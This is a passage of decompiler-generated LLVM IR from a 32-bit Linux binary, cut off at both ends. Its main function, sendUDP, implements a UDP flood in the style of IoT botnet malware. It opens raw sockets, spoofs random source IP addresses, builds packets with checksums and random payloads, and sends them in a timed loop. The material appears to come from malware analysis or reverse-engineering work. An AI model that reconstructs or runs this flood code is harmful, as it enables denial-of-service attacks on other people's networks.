  %v4_804b2c5 = add nuw nsw i32 %storemerge39, 1
  store i32 %v4_804b2c5, i32* @eax, align 4
  %exitcond = icmp eq i32 %v4_804b2c5, %arg6
  br i1 %exitcond, label %dec_label_pc_804b2d4, label %dec_label_pc_804b1d8

dec_label_pc_804b2d4:                             ; preds = %dec_label_pc_804b2c5, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %arg6, %dec_label_pc_804b2c5 ]
  store i32 %v0_804b1a1, i32* @edi, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v2_804b208, { 1, 0, 2 }
  uselistorder i32 %v5_804b1bf, { 1, 0 }
  uselistorder label %dec_label_pc_804b2c5, { 1, 0 }
  uselistorder label %dec_label_pc_804b226, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_5()
  %tmp41 = call i16 @__decompiler_undefined_function_5()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %v0_804b2dd = load i32, i32* @ebx, align 4
  %v12_804b2de = ptrtoint i32* %stack_var_-124 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_804b2e7 = icmp eq i32 %arg2, 0
  %v1_804b2eb = icmp eq i1 %v4_804b2e7, false
  br i1 %v1_804b2eb, label %dec_label_pc_804b2f8, label %dec_label_pc_804b2ed

dec_label_pc_804b2ed:                             ; preds = %entry
  %v1_804b2ed = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_804b310

dec_label_pc_804b2f8:                             ; preds = %entry
  %v1_804b2fb = urem i32 %arg2, 65536
  store i32 %v1_804b2fb, i32* %eax.global-to-local, align 4
  %v1_804b304 = call i32 @htons(i32 %v1_804b2fb)
  br label %dec_label_pc_804b310

dec_label_pc_804b310:                             ; preds = %dec_label_pc_804b2ed, %dec_label_pc_804b2f8
  %v2_804b313 = ptrtoint i32* %stack_var_-68 to i32
  %v15_804b316 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v15_804b316, i32* %eax.global-to-local, align 4
  %v4_804b31d = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v4_804b31d, i32* %eax.global-to-local, align 4
  %v1_804b325 = icmp eq i32 %v4_804b31d, 0
  %v1_804b327 = icmp eq i1 %v1_804b325, false
  br i1 %v1_804b327, label %dec_label_pc_804b7c3, label %dec_label_pc_804b32d

dec_label_pc_804b32d:                             ; preds = %dec_label_pc_804b310
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_804b346 = icmp eq i32 %arg4, 32
  %v1_804b34a = icmp eq i1 %v9_804b346, false
  br i1 %v1_804b34a, label %dec_label_pc_804b482, label %dec_label_pc_804b350

dec_label_pc_804b350:                             ; preds = %dec_label_pc_804b32d
  %v4_804b359 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v4_804b359, i32* %eax.global-to-local, align 4
  %v4_804b364 = icmp eq i32 %v4_804b359, 0
  %v1_804b368 = icmp eq i1 %v4_804b364, false
  br i1 %v1_804b368, label %dec_label_pc_804b385, label %dec_label_pc_804b36a

dec_label_pc_804b36a:                             ; preds = %dec_label_pc_804b350
  %v0_804b36a = load i32, i32* @global_var_805a160.18, align 32
  store i32 %v0_804b36a, i32* %eax.global-to-local, align 4
  %v3_804b378 = call i32 @Rootsprintf(i32 %v0_804b36a, i32 ptrtoint ([27 x i8]* @global_var_8056470.140 to i32))
  store i32 %v3_804b378, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b7c3

dec_label_pc_804b385:                             ; preds = %dec_label_pc_804b350
  %v1_804b388 = add i32 %arg5, 1
  store i32 %v1_804b388, i32* %eax.global-to-local, align 4
  %v1_804b38d = call i32 @malloc(i32 %v1_804b388)
  store i32 %v1_804b38d, i32* %eax.global-to-local, align 4
  %v4_804b398 = icmp eq i32 %v1_804b38d, 0
  br i1 %v4_804b398, label %dec_label_pc_804b7c3, label %dec_label_pc_804b3a2

dec_label_pc_804b3a2:                             ; preds = %dec_label_pc_804b385
  store i32 %v1_804b388, i32* %edx.global-to-local, align 4
  %v1_804b3ab = inttoptr i32 %v1_804b38d to i8*
  store i32 %v1_804b38d, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804b3b0 = and i32 %v1_804b38d, -256
  store i32 %v1_804b3b0, i32* %eax.global-to-local, align 4
  %v5_804b3b2 = call i8* @_memset(i8* %v1_804b3ab, i32 %v1_804b3b0, i32 %v1_804b388)
  %v3_804b3ba = call i32 @makeRandomStr(i8* %v1_804b3ab, i32 %arg5)
  store i32 %v3_804b3ba, i32* %eax.global-to-local, align 4
  %v2_804b3c7 = call i32 @__GI_time(i32* null)
  %v5_804b3cf = add i32 %v2_804b3c7, %arg3
  store i32 %v5_804b3cf, i32* %eax.global-to-local, align 4
  %v1_804b456 = mul i32 %arg8, 100
  %v2_804b45f = mul i32 %arg8, 1000
  %v1_804b466 = sext i32 %v2_804b45f to i64
  br label %dec_label_pc_804b3e5.outer

dec_label_pc_804b3e5.outer:                       ; preds = %dec_label_pc_804b443, %dec_label_pc_804b47a, %dec_label_pc_804b3a2
  %stack_var_-88.0.ph = phi i32 [ 0, %dec_label_pc_804b3a2 ], [ 0, %dec_label_pc_804b443 ], [ %v4_804b47a, %dec_label_pc_804b47a ]
  %stack_var_-92.0.ph = phi i32 [ 0, %dec_label_pc_804b3a2 ], [ %v4_804b438, %dec_label_pc_804b443 ], [ %v4_804b438, %dec_label_pc_804b47a ]
  br label %dec_label_pc_804b3e5

dec_label_pc_804b3e5:                             ; preds = %dec_label_pc_804b3e5.outer, %dec_label_pc_804b419
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_804b419 ], [ %stack_var_-92.0.ph, %dec_label_pc_804b3e5.outer ]
  store i32 %v2_804b313, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v4_804b359, i32* %stack_var_-156, align 4
  %v7_804b3fa = call i32 @__libc_sendto(i32 %v4_804b359, i32 %v1_804b38d, i32 %arg5, i32 0, i32 %v2_804b313, i32 16)
  store i32 %v7_804b3fa, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_804b405 = icmp eq i32 %stack_var_-92.0, %arg6
  %v1_804b408 = icmp eq i1 %v15_804b405, false
  br i1 %v1_804b408, label %dec_label_pc_804b438, label %dec_label_pc_804b40a

dec_label_pc_804b40a:                             ; preds = %dec_label_pc_804b3e5
  br i1 %v1_804b2eb, label %dec_label_pc_804b419, label %dec_label_pc_804b410

dec_label_pc_804b410:                             ; preds = %dec_label_pc_804b40a
  %v0_804b410 = load i32, i32* %stack_var_-156, align 4
  %v1_804b410 = call i32 @rand_cmwc(i32 %v0_804b410)
  store i32 %v1_804b410, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b419

dec_label_pc_804b419:                             ; preds = %dec_label_pc_804b40a, %dec_label_pc_804b410
  %v2_804b41e = call i32 @__GI_time(i32* null)
  store i32 %v2_804b41e, i32* %eax.global-to-local, align 4
  %v8_804b429 = icmp sgt i32 %v2_804b41e, %v5_804b3cf
  br i1 %v8_804b429, label %dec_label_pc_804b7c3, label %dec_label_pc_804b3e5

dec_label_pc_804b438:                             ; preds = %dec_label_pc_804b3e5
  %v4_804b438 = add i32 %stack_var_-92.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804b43e = icmp eq i32 %stack_var_-88.0.ph, %arg7
  %v1_804b441 = icmp eq i1 %v15_804b43e, false
  br i1 %v1_804b441, label %dec_label_pc_804b47a, label %dec_label_pc_804b443

dec_label_pc_804b443:                             ; preds = %dec_label_pc_804b438
  store i32 %v1_804b456, i32* %edx.global-to-local, align 4
  store i32 %v2_804b45f, i32* %eax.global-to-local, align 4
  %v2_804b466 = call i32 @usleep(i64 %v1_804b466)
  store i32 %v2_804b466, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3e5.outer

dec_label_pc_804b47a:                             ; preds = %dec_label_pc_804b438
  %v4_804b47a = add i32 %stack_var_-88.0.ph, 1
  br label %dec_label_pc_804b3e5.outer

dec_label_pc_804b482:                             ; preds = %dec_label_pc_804b32d
  store i32 %v12_804b2de, i32* %eax.global-to-local, align 4
  %v4_804b490 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v4_804b490, i32* %eax.global-to-local, align 4
  %v4_804b49b = icmp eq i32 %v4_804b490, 0
  %v1_804b49f = icmp eq i1 %v4_804b49b, false
  br i1 %v1_804b49f, label %dec_label_pc_804b4bc, label %dec_label_pc_804b4a1

dec_label_pc_804b4a1:                             ; preds = %dec_label_pc_804b482
  %v0_804b4a1 = load i32, i32* @global_var_805a160.18, align 32
  store i32 %v0_804b4a1, i32* %eax.global-to-local, align 4
  %v3_804b4af = call i32 @Rootsprintf(i32 %v0_804b4a1, i32 ptrtoint ([27 x i8]* @global_var_8056470.140 to i32))
  store i32 %v3_804b4af, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b7c0

dec_label_pc_804b4bc:                             ; preds = %dec_label_pc_804b482
  store i32 1, i32* %stack_var_-72, align 4
  %v2_804b4c8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804b4c8, i32* %eax.global-to-local, align 4
  store i32 %v4_804b490, i32* %stack_var_-156, align 4
  %v5_804b4d3 = call i32 @__GI_setsockopt(i32 %v4_804b490, i32 0, i32 3, i32 %v2_804b4c8, i32 4)
  store i32 %v5_804b4d3, i32* %eax.global-to-local, align 4
  %v2_804b4db = icmp slt i32 %v5_804b4d3, 0
  %v1_804b4dd = icmp eq i1 %v2_804b4db, false
  br i1 %v1_804b4dd, label %dec_label_pc_804b533.preheader, label %dec_label_pc_804b4df

dec_label_pc_804b533.preheader:                   ; preds = %dec_label_pc_804b4bc
  br label %dec_label_pc_804b503

dec_label_pc_804b4df:                             ; preds = %dec_label_pc_804b4bc
  %v0_804b4df = load i32, i32* @global_var_805a160.18, align 32
  store i32 %v0_804b4df, i32* %eax.global-to-local, align 4
  %v3_804b4ed = call i32 @Rootsprintf(i32 %v0_804b4df, i32 ptrtoint ([33 x i8]* @global_var_805648c.141 to i32))
  store i32 %v3_804b4ed, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b7c0

dec_label_pc_804b503:                             ; preds = %dec_label_pc_804b533.preheader, %dec_label_pc_804b503
  %stack_var_-32.088 = phi i32 [ 50, %dec_label_pc_804b533.preheader ], [ %v4_804b533, %dec_label_pc_804b503 ]
  %v4_804b533 = add nsw i32 %stack_var_-32.088, -1
  %v2_804b508 = call i32 @__GI_time(i32* null)
  store i32 %v2_804b508, i32* %eax.global-to-local, align 4
  store i32 %v2_804b508, i32* @ebx, align 4
  %v1_804b512 = call i32 @rand_cmwc(i32 0)
  %v1_804b517 = load i32, i32* @ebx, align 4
  %v2_804b517 = xor i32 %v1_804b517, %v1_804b512
  store i32 %v2_804b517, i32* @eax, align 4
  %v1_804b51d = call i32 @srand(i32 %v2_804b517)
  store i32 %v1_804b51d, i32* @eax, align 4
  %v0_804b525 = call i32 @random()
  store i32 %v0_804b525, i32* %eax.global-to-local, align 4
  %v1_804b52b = call i32 @init_rand(i32 %v0_804b525)
  store i32 %v1_804b52b, i32* %eax.global-to-local, align 4
  %v13_804b536 = icmp eq i32 %v4_804b533, 0
  %v1_804b53a = icmp eq i1 %v13_804b536, false
  br i1 %v1_804b53a, label %dec_label_pc_804b503, label %dec_label_pc_804b53c

dec_label_pc_804b53c:                             ; preds = %dec_label_pc_804b503
  %v4_804b53c = icmp eq i32 %arg4, 0
  %v1_804b540 = icmp eq i1 %v4_804b53c, false
  br i1 %v1_804b540, label %dec_label_pc_804b54b, label %dec_label_pc_804b561

dec_label_pc_804b54b:                             ; preds = %dec_label_pc_804b53c
  %v5_804b552 = sub i32 32, %arg4
  %v2_804b55a = urem i32 %v5_804b552, 32
  %v4_804b55a = icmp eq i32 %v2_804b55a, 0
  br i1 %v4_804b55a, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_804b54b
  %v5_804b55a = shl i32 1, %v2_804b55a
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_804b54b, %bb
  %v0_804b55c = phi i32 [ %v5_804b55a, %bb ], [ 1, %dec_label_pc_804b54b ]
  %v1_804b55c = sub i32 0, %v0_804b55c
  store i32 %v1_804b55c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b561

dec_label_pc_804b561:                             ; preds = %dec_label_pc_804b53c, %bb84
  %storemerge6 = phi i32 [ %v1_804b55c, %bb84 ], [ 0, %dec_label_pc_804b53c ]
  %v1_804b564 = add i32 %arg5, 28
  %v1_804b570 = add i32 %arg5, 58
  %v2_804b573 = and i32 %v1_804b570, -16
  %v2_804b579 = sub i32 %v12_804b2de, %v2_804b573
  %v1_804b581 = add i32 %v2_804b579, 15
  %v2_804b584 = and i32 %v1_804b581, -16
  %v1_804b59c = add i32 %v2_804b584, 20
  %v5_804b59f = inttoptr i32 %v1_804b59c to i16*
  %v1_804b5a5 = add i32 %arg5, 8
  store i32 %v1_804b5a5, i32* %eax.global-to-local, align 4
  store i32 %v1_804b5a5, i32* @ebx, align 4
  %v5_804b5ad = add i32 %v2_804b579, -16
  %v6_804b5ad = inttoptr i32 %v5_804b5ad to i32*
  store i32 %storemerge6, i32* %v6_804b5ad, align 4
  %v2_804b5b0 = call i32 @GetRandomIP(i32 %v1_804b564, i32 %v2_804b584)
  store i32 %v2_804b5b0, i32* %eax.global-to-local, align 4
  %v0_804b5b5 = load i32, i32* @esp, align 4
  %v3_804b5bb = inttoptr i32 %v0_804b5b5 to i32*
  store i32 %v2_804b5b0, i32* %v3_804b5bb, align 4
  %v0_804b5bc = call i32 @htonl()
  store i32 %v0_804b5bc, i32* %eax.global-to-local, align 4
  %v0_804b5c1 = load i32, i32* @esp, align 4
  %v3_804b5c4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_804b5c4, i32* %edx.global-to-local, align 4
  %v0_804b5ca = load i32, i32* @ebx, align 4
  %v2_804b5ca = add i32 %v0_804b5c1, 8
  %v3_804b5ca = inttoptr i32 %v2_804b5ca to i32*
  store i32 %v0_804b5ca, i32* %v3_804b5ca, align 4
  %v1_804b5cb = add i32 %v0_804b5c1, 4
  %v2_804b5cb = inttoptr i32 %v1_804b5cb to i32*
  store i32 17, i32* %v2_804b5cb, align 4
  %v3_804b5cd = inttoptr i32 %v0_804b5c1 to i32*
  store i32 %v0_804b5bc, i32* %v3_804b5cd, align 4
  %v0_804b5ce = load i32, i32* %edx.global-to-local, align 4
  %v2_804b5ce = add i32 %v0_804b5c1, -4
  %v3_804b5ce = inttoptr i32 %v2_804b5ce to i32*
  store i32 %v0_804b5ce, i32* %v3_804b5ce, align 4
  %v5_804b5cf = add i32 %v0_804b5c1, -8
  %v6_804b5cf = inttoptr i32 %v5_804b5cf to i32*
  store i32 %v2_804b584, i32* %v6_804b5cf, align 4
  %v0_804b5d2 = call i32 @makeIPPacket()
  %v0_804b5d7 = load i32, i32* @esp, align 4
  %v1_804b5e0 = urem i32 %v1_804b5a5, 65536
  store i32 %v1_804b5e0, i32* %eax.global-to-local, align 4
  %v2_804b5e8 = add i32 %v0_804b5d7, 8
  %v3_804b5e8 = inttoptr i32 %v2_804b5e8 to i32*
  store i32 %v1_804b5e0, i32* %v3_804b5e8, align 4
  %v2_804b5e9 = call i32 @htons(i32 %v1_804b59c)
  %v3_804b5e9 = trunc i32 %v2_804b5e9 to i16
  %sext7 = mul i32 %v2_804b5e9, 65536
  %v1_804b5f1 = sdiv i32 %sext7, 65536
  store i32 %v1_804b5f1, i32* %edx.global-to-local, align 4
  store i32 %v1_804b59c, i32* %eax.global-to-local, align 4
  %v3_804b5f6 = add i32 %v2_804b584, 24
  %v4_804b5f6 = inttoptr i32 %v3_804b5f6 to i16*
  store i16 %v3_804b5e9, i16* %v4_804b5f6, align 8
  %v2_804b5fa = call i32 @rand_cmwc(i32 %v1_804b59c)
  %sext = mul i32 %v2_804b5fa, 65536
  %v1_804b5ff = sdiv i32 %sext, 65536
  store i32 %v1_804b5ff, i32* %edx.global-to-local, align 4
  store i32 %v1_804b59c, i32* %eax.global-to-local, align 4
  %v1_804b604 = trunc i32 %v1_804b5ff to i16
  store i16 %v1_804b604, i16* %v5_804b59f, align 4
  br i1 %v1_804b2eb, label %dec_label_pc_804b618, label %dec_label_pc_804b60d

dec_label_pc_804b60d:                             ; preds = %dec_label_pc_804b561
  %v2_804b60d = call i32 @rand_cmwc(i32 %v1_804b59c)
  store i32 %v2_804b60d, i32* %eax.global-to-local, align 4
  %.pre37 = urem i32 %arg2, 65536
  br label %dec_label_pc_804b630

dec_label_pc_804b618:                             ; preds = %dec_label_pc_804b561
  %v1_804b61b = urem i32 %arg2, 65536
  store i32 %v1_804b61b, i32* %eax.global-to-local, align 4
  %v0_804b620 = load i32, i32* @esp, align 4
  %v2_804b623 = add i32 %v0_804b620, -16
  %v3_804b623 = inttoptr i32 %v2_804b623 to i32*
  store i32 %v1_804b61b, i32* %v3_804b623, align 4
  %v1_804b624 = sext i16 %tmp41 to i32
  %v2_804b624 = call i32 @htons(i32 %v1_804b624)
  store i32 %v2_804b624, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b630

dec_label_pc_804b630:                             ; preds = %dec_label_pc_804b60d, %dec_label_pc_804b618
  %v1_804b6db.pre-phi = phi i32 [ %.pre37, %dec_label_pc_804b60d ], [ %v1_804b61b, %dec_label_pc_804b618 ]
  %storemerge5.in = phi i32 [ %v2_804b60d, %dec_label_pc_804b60d ], [ %v2_804b624, %dec_label_pc_804b618 ]
  %storemerge5 = trunc i32 %storemerge5.in to i16
  %sext8 = mul i32 %storemerge5.in, 65536
  %v4_804b633 = sdiv i32 %sext8, 65536
  store i32 %v4_804b633, i32* %edx.global-to-local, align 4
  %v3_804b636 = add i32 %v2_804b584, 22
  %v4_804b636 = inttoptr i32 %v3_804b636 to i16*
  store i16 %storemerge5, i16* %v4_804b636, align 2
  %v1_804b63d = add i32 %v2_804b584, 26
  %v2_804b63d = inttoptr i32 %v1_804b63d to i16*
  store i16 0, i16* %v2_804b63d, align 2
  %v1_804b646 = add i32 %v2_804b584, 28
  store i32 %v1_804b646, i32* %eax.global-to-local, align 4
  %v4_804b649 = load i32, i32* @esp, align 4
  %v5_804b649 = add i32 %v4_804b649, -4
  %v6_804b649 = inttoptr i32 %v5_804b649 to i32*
  store i32 %arg5, i32* %v6_804b649, align 4
  %v0_804b64c = load i32, i32* %eax.global-to-local, align 4
  %v2_804b64c = add i32 %v4_804b649, -8
  %v3_804b64c = inttoptr i32 %v2_804b64c to i32*
  store i32 %v0_804b64c, i32* %v3_804b64c, align 4
  %v3_804b64d = inttoptr i32 %v4_804b633 to i8*
  %v4_804b64d = call i32 @makeRandomStr(i8* %v3_804b64d, i32 %v12_804b2de)
  %v0_804b652 = load i32, i32* @esp, align 4
  store i32 %v2_804b584, i32* %eax.global-to-local, align 4
  %v1_804b658 = or i32 %v2_804b584, 2
  %v2_804b658 = inttoptr i32 %v1_804b658 to i16*
  %v3_804b658 = load i16, i16* %v2_804b658, align 2
  %v4_804b658 = zext i16 %v3_804b658 to i32
  store i32 %v4_804b658, i32* %edx.global-to-local, align 4
  store i32 %v2_804b584, i32* %eax.global-to-local, align 4
  %v2_804b667 = add i32 %v0_804b652, 4
  %v3_804b667 = inttoptr i32 %v2_804b667 to i32*
  store i32 %v4_804b658, i32* %v3_804b667, align 4
  %v0_804b668 = load i32, i32* %eax.global-to-local, align 4
  %v3_804b668 = inttoptr i32 %v0_804b652 to i32*
  store i32 %v0_804b668, i32* %v3_804b668, align 4
  %v3_804b669 = inttoptr i32 %v4_804b633 to i16*
  %v4_804b669 = call i32 @csum(i16* %v3_804b669, i32 %v12_804b2de)
  %v5_804b669 = trunc i32 %v4_804b669 to i16
  %sext11 = mul i32 %v4_804b669, 65536
  %v1_804b671 = sdiv i32 %sext11, 65536
  store i32 %v1_804b671, i32* %edx.global-to-local, align 4
  store i32 %v2_804b584, i32* %eax.global-to-local, align 4
  %v3_804b676 = or i32 %v2_804b584, 10
  %v4_804b676 = inttoptr i32 %v3_804b676 to i16*
  store i16 %v5_804b669, i16* %v4_804b676, align 2
  %v0_804b67a = load i32, i32* @esp, align 4
  %v1_804b67d = add i32 %v0_804b67a, -16
  %v2_804b67d = inttoptr i32 %v1_804b67d to i32*
  store i32 0, i32* %v2_804b67d, align 4
  %v2_804b67f = inttoptr i32 %v4_804b633 to i32*
  %v3_804b67f = call i32 @__GI_time(i32* %v2_804b67f)
  %v0_804b684 = load i32, i32* @esp, align 4
  %v1_804b684 = add i32 %v0_804b684, 16
  %v5_804b687 = add i32 %v3_804b67f, %arg3
  store i32 %v5_804b687, i32* %eax.global-to-local, align 4
  %v3_804b705 = or i32 %v2_804b584, 4
  %v4_804b705 = inttoptr i32 %v3_804b705 to i16*
  %v2_804b728 = or i32 %v2_804b584, 12
  %v3_804b728 = inttoptr i32 %v2_804b728 to i32*
  %v1_804b794 = mul i32 %arg8, 100
  %v2_804b79d = mul i32 %arg8, 1000
  br label %dec_label_pc_804b69d.outer

dec_label_pc_804b69d.outer:                       ; preds = %dec_label_pc_804b781, %dec_label_pc_804b7b8, %dec_label_pc_804b630
  %v0_804b6a3.pre = phi i32 [ %v1_804b684, %dec_label_pc_804b630 ], [ %v1_804b7a9, %dec_label_pc_804b781 ], [ %v0_804b6a3.pre.pre.pre, %dec_label_pc_804b7b8 ]
  %stack_var_-102.0.ph = phi i16 [ %tmp, %dec_label_pc_804b630 ], [ %storemerge, %dec_label_pc_804b781 ], [ %storemerge, %dec_label_pc_804b7b8 ]
  %stack_var_-80.0.ph = phi i32 [ 0, %dec_label_pc_804b630 ], [ 0, %dec_label_pc_804b781 ], [ %v4_804b7b8, %dec_label_pc_804b7b8 ]
  %stack_var_-84.0.ph = phi i32 [ 0, %dec_label_pc_804b630 ], [ %v4_804b776, %dec_label_pc_804b781 ], [ %v4_804b776, %dec_label_pc_804b7b8 ]
  br label %dec_label_pc_804b69d

dec_label_pc_804b69d:                             ; preds = %dec_label_pc_804b69d.outer, %dec_label_pc_804b758
  %v0_804b6a3 = phi i32 [ %v1_804b762, %dec_label_pc_804b758 ], [ %v0_804b6a3.pre, %dec_label_pc_804b69d.outer ]
  %stack_var_-102.0 = phi i16 [ %storemerge, %dec_label_pc_804b758 ], [ %stack_var_-102.0.ph, %dec_label_pc_804b69d.outer ]
  %stack_var_-84.0 = phi i32 [ 0, %dec_label_pc_804b758 ], [ %stack_var_-84.0.ph, %dec_label_pc_804b69d.outer ]
  store i32 %v2_804b313, i32* %eax.global-to-local, align 4
  store i32 %v2_804b584, i32* %edx.global-to-local, align 4
  %v1_804b6a6 = add i32 %v0_804b6a3, -12
  %v2_804b6a6 = inttoptr i32 %v1_804b6a6 to i32*
  store i32 16, i32* %v2_804b6a6, align 4
  %v2_804b6a8 = add i32 %v0_804b6a3, -16
  %v3_804b6a8 = inttoptr i32 %v2_804b6a8 to i32*
  store i32 %v2_804b313, i32* %v3_804b6a8, align 4
  %v1_804b6a9 = add i32 %v0_804b6a3, -20
  %v2_804b6a9 = inttoptr i32 %v1_804b6a9 to i32*
  store i32 0, i32* %v2_804b6a9, align 4
  %v5_804b6ab = add i32 %v0_804b6a3, -24
  %v6_804b6ab = inttoptr i32 %v5_804b6ab to i32*
  store i32 %v1_804b564, i32* %v6_804b6ab, align 4
  %v0_804b6ae = load i32, i32* %edx.global-to-local, align 4
  %v2_804b6ae = add i32 %v0_804b6a3, -28
  %v3_804b6ae = inttoptr i32 %v2_804b6ae to i32*
  store i32 %v0_804b6ae, i32* %v3_804b6ae, align 4
  %v5_804b6af = add i32 %v0_804b6a3, -32
  %v6_804b6af = inttoptr i32 %v5_804b6af to i32*
  store i32 %v4_804b490, i32* %v6_804b6af, align 4
  %v6_804b6b2 = call i32 @__libc_sendto(i32 %stack_var_-80.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804b6b2, i32* %eax.global-to-local, align 4
  %v1_804b6ba = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  %sext3 = mul i32 %v1_804b6ba, 65536
  %v1_804b6bf = sdiv i32 %sext3, 65536
  store i32 %v1_804b6bf, i32* %edx.global-to-local, align 4
  store i32 %v1_804b59c, i32* %eax.global-to-local, align 4
  %v1_804b6c4 = trunc i32 %v1_804b6bf to i16
  store i16 %v1_804b6c4, i16* %v5_804b59f, align 4
  br i1 %v1_804b2eb, label %dec_label_pc_804b6d8, label %dec_label_pc_804b6cd

dec_label_pc_804b6cd:                             ; preds = %dec_label_pc_804b69d
  %v1_804b6cd = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  br label %dec_label_pc_804b6f0

dec_label_pc_804b6d8:                             ; preds = %dec_label_pc_804b69d
  store i32 %v1_804b6db.pre-phi, i32* %eax.global-to-local, align 4
  %v0_804b6e0 = load i32, i32* @esp, align 4
  %v2_804b6e3 = add i32 %v0_804b6e0, -16
  %v3_804b6e3 = inttoptr i32 %v2_804b6e3 to i32*
  store i32 %v1_804b6db.pre-phi, i32* %v3_804b6e3, align 4
  %v1_804b6e4 = sext i16 %stack_var_-102.0 to i32
  %v2_804b6e4 = call i32 @htons(i32 %v1_804b6e4)
  br label %dec_label_pc_804b6f0

dec_label_pc_804b6f0:                             ; preds = %dec_label_pc_804b6cd, %dec_label_pc_804b6d8
  %storemerge.in = phi i32 [ %v1_804b6cd, %dec_label_pc_804b6cd ], [ %v2_804b6e4, %dec_label_pc_804b6d8 ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i32 %v1_804b59c, i32* %eax.global-to-local, align 4
  %v4_804b6f3 = urem i32 %storemerge.in, 65536
  %v5_804b6f3 = load i32, i32* %edx.global-to-local, align 4
  %v6_804b6f3 = and i32 %v5_804b6f3, -65536
  %v7_804b6f3 = or i32 %v6_804b6f3, %v4_804b6f3
  store i32 %v7_804b6f3, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_804b636, align 2
  %sext13 = mul i32 %storemerge.in, 65536
  %v1_804b6fb = sdiv i32 %sext13, 65536
  %v2_804b6fb = call i32 @rand_cmwc(i32 %v1_804b6fb)
  %sext4 = mul i32 %v2_804b6fb, 65536
  %v1_804b700 = sdiv i32 %sext4, 65536
  store i32 %v1_804b700, i32* %edx.global-to-local, align 4
  store i32 %v2_804b584, i32* %eax.global-to-local, align 4
  %v1_804b705 = trunc i32 %v1_804b700 to i16
  store i16 %v1_804b705, i16* %v4_804b705, align 4
  %v0_804b709 = load i32, i32* @esp, align 4
  %v5_804b70c = add i32 %v0_804b709, -16
  %v6_804b70c = inttoptr i32 %v5_804b70c to i32*
  store i32 %storemerge6, i32* %v6_804b70c, align 4
  %v3_804b70f = call i32 @GetRandomIP(i32 %v1_804b6fb, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804b70f, i32* %eax.global-to-local, align 4
  %v0_804b714 = load i32, i32* @esp, align 4
  %v3_804b71a = inttoptr i32 %v0_804b714 to i32*
  store i32 %v3_804b70f, i32* %v3_804b71a, align 4
  %v0_804b71b = call i32 @htonl()
  store i32 %v0_804b71b, i32* %edx.global-to-local, align 4
  store i32 %v0_804b71b, i32* %v3_804b728, align 4
  store i32 %v2_804b584, i32* %eax.global-to-local, align 4
  %v3_804b72e = load i16, i16* %v2_804b658, align 2
  %v4_804b72e = zext i16 %v3_804b72e to i32
  store i32 %v4_804b72e, i32* %edx.global-to-local, align 4
  store i32 %v2_804b584, i32* %eax.global-to-local, align 4
  %v1_804b73d = load i32, i32* @esp, align 4
  %v2_804b73d = add i32 %v1_804b73d, -4
  %v3_804b73d = inttoptr i32 %v2_804b73d to i32*
  store i32 %v4_804b72e, i32* %v3_804b73d, align 4
  %v0_804b73e = load i32, i32* %eax.global-to-local, align 4
  %v2_804b73e = add i32 %v1_804b73d, -8
  %v3_804b73e = inttoptr i32 %v2_804b73e to i32*
  store i32 %v0_804b73e, i32* %v3_804b73e, align 4
  %v3_804b73f = inttoptr i32 %v1_804b6fb to i16*
  %v4_804b73f = call i32 @csum(i16* %v3_804b73f, i32 ptrtoint (i32* @0 to i32))
  %v5_804b73f = trunc i32 %v4_804b73f to i16
  %sext16 = mul i32 %v4_804b73f, 65536
  %v1_804b747 = sdiv i32 %sext16, 65536
  store i32 %v1_804b747, i32* %edx.global-to-local, align 4
  store i16 %v5_804b73f, i16* %v4_804b676, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_804b753 = icmp eq i32 %stack_var_-84.0, %arg6
  %v1_804b756 = icmp eq i1 %v15_804b753, false
  br i1 %v1_804b756, label %dec_label_pc_804b776, label %dec_label_pc_804b758

dec_label_pc_804b758:                             ; preds = %dec_label_pc_804b6f0
  %v0_804b758 = load i32, i32* @esp, align 4
  %v1_804b75b = add i32 %v0_804b758, -16
  %v2_804b75b = inttoptr i32 %v1_804b75b to i32*
  store i32 0, i32* %v2_804b75b, align 4
  %v2_804b75d = inttoptr i32 %v1_804b6fb to i32*
  %v3_804b75d = call i32 @__GI_time(i32* %v2_804b75d)
